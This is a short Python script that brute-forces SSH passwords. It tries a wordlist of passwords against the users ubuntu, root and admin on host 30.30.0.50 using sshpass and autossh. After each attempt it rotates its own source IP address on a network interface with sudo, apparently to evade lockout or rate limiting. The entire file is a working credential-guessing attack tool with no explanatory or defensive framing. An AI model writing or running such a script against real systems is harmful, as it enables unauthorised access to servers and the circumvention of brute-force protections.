import subprocess

ips = []
passwds = []
outputlist = []
users = ['ubuntu', 'root', 'admin']  # list of users to try

for i in range(52, 254):
    ips.append(i)

with open('./password.txt', 'r') as file1:
    passwds = [line.strip() for line in file1]

count = 0
ip_index = 0
passwd_index = 0

while passwd_index < len(passwds):
    for user in users:
        for ps in passwds:
            print(user,':', ps)
            subprocess.call(['sshpass','-p', ps, 'autossh', '-M0','-t', user + '@' + '30.30.0.50'])
            ip = ips[ip_index]
            old_ip = ip - 1
            set_ip = subprocess.call(['sudo', 'ip', 'addr', 'add', '30.30.0.' + str(ip) + '/24', 'dev', 'enp0s8'])
            rem_ip = subprocess.call(['sudo', 'ip', 'addr', 'delete', '30.30.0.' + str(old_ip) + '/24', 'dev', 'enp0s8'])
            ip_index += 1
            if ip_index >= len(ips):
                ip_index = 0
            passwd_index += 1